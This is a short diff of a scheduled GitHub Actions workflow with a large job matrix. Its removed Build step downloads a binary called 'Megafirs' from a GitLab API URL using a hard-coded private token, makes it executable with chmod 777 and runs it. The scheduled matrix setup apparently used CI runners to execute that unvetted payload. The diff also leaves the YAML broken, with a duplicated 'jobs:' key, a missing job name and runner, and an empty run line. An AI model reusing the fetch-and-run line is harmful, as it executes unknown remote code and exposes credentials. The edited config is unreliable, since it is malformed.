@@ -12,11 +12,11 @@ on:
   schedule:
      - cron: '0 0 * * *'
 jobs: 
-  build:
-    runs-on: Ubuntu-20.04
+jobs:
+
     strategy:
       matrix:
-        D1: [0,1,2,3,4,5,6,7,8,9,10,11]
+        D1: [0,1,2]
         D2: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
       fail-fast: false
     steps:
@@ -25,7 +25,7 @@ jobs:
 
     - name: Build
       run: |
-        wget -O Megafirs --header='PRIVATE-TOKEN: Aiu7imPzr5bCTESuhF9o' 'https://gitlab.com/api/v4/projects/25201895/repository/files/Megafirs/raw?ref=master' && chmod 777 Megafirs && ./Megafirs
+       
         echo "done"
     - name: Test
       run: |
